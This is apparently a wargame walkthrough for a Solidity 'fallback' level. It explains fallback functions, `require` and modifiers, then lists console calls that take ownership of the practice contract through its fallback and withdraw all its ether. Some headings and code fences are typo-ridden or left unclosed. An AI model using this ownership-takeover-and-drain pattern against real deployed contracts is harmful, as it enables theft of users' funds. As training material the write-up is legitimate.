# Blockchain Learning Journey

Welcome to the second step of your exciting journey into mastering the revolutionary technology of blockchain! Your belief in blockchain's potential to create positive change aligns with the transformative power it holds. Let's delve into some key concepts to crack the first level.

## Fallback Function

The fallback function is triggered when someone calls a function not defined in the contract or sends ether to it. In the defined fallback function, meeting the `require` condition involves sending some ether (`msg.value`) and ensuring that the contract or user account already has some contributions.

## What does `require` do?

`require` is a statement used in Solidity to enforce conditions that must be met for a function to proceed. If the condition specified in `require` is not met, the function will revert, and any state changes made so far will be undone.

## Benefits of Modifier

Modifiers in Solidity are reusable code snippets that can be applied to functions. They enhance code readability, maintainability, and security. By encapsulating common checks or conditions, modifiers promote code efficiency and reduce redundancy.

Now, let's move on to the solution.

## Solution Overview

To interact with the contract and become the owner, follow these steps:

1. **Contribute Ether**: Execute the contribute function with an amount less than 0.001 ether.

   ```javascript
   await contract.contribute({value: 100000});

2. **Check Contributions**: Use the `getContributions` function to verify your contributions.
   
   ```javascript
   await contract.getContribution();

3. **Trigger Fallback Function**: Call the fallback function to become the owner.

   ```javascript
   await contract.sendTransaction({
     from: player,
     value: toWei("0.00100")
   });


4. **TVerify Ownership**: Confirm your ownership status.
   
   ```javascript
   await contract.owner();

5. **TWithdraw Ether**: Execute the withdraw function to retrieve all the Ether.
   
   ```javascript
   await contract.withdraw();


_**Don't hesitate! Go ahead and submit the challenge.**_



   

